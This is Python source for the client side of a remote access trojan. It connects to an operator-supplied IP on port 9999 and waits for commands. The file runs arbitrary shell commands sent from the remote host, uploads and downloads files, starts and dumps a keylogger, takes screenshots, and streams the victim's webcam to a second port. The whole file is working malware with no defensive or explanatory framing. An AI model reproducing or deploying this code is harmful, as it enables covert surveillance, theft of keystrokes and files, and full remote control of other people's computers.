import socket
import json
import subprocess
from subprocess import PIPE
import os
from tools.keylogger import KeyLogger
import threading
import cv2
import pickle
import struct
import pyautogui

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('#', 9999)) # Enter your ip address in '#'

def data_receive():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        
def file_upload(filename):
    file = open(filename, 'rb')
    soc.send(file.read())
    file.close

def file_download(filename):
    file = open(filename, 'wb')
    soc.settimeout(1)
    _file = soc.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = soc.recv(1024)
        except socket.timeout as e:
            break
    soc.settimeout(None)
    file.close()

def open_log():
    soc.send(KeyLogger().read_log().encode())

def log_thread():
    t = threading.Thread(target=open_log)
    t.start()

def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('#', 4444)) # Enter your ip address in '#'
    vid = cv2.VideoCapture(0)
    while (vid.isOpened()):
        img, frame = vid.read()
        b = pickle.dumps(frame)
        message = struct.pack("Q", len(b))+b
        sock.sendall(message)

def send_byte_stream():
    t = threading.Thread(target=byte_stream)
    t.start()

def run_command():
    while True:
        command = data_receive()
        if command in ('exit', 'quit'):
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            file_upload(command[9:])  
        elif command[:6] == 'upload':
            file_download(command[7:])
        elif command == 'keylogger_start':
            KeyLogger().start_logger()
        elif command == 'keylogger_dump':
            log_thread()
        elif command == 'keylogger_stop':
            KeyLogger().stop_listener()
        elif command == 'webcam_stream':
            send_byte_stream()
        elif command == 'screenshot':
            ss = pyautogui.screenshot()
            ss.save('screenshot.png')
            file_upload('screenshot.png')
        else:
          execute = subprocess.Popen(
              command,
              shell = True,
              stdout = PIPE,
              stderr = PIPE,
              stdin = PIPE
          )
          data = execute.stdout.read() + execute.stderr.read()
          data = data.decode()
          output = json.dumps(data)
          soc.send(output.encode())

run_command()
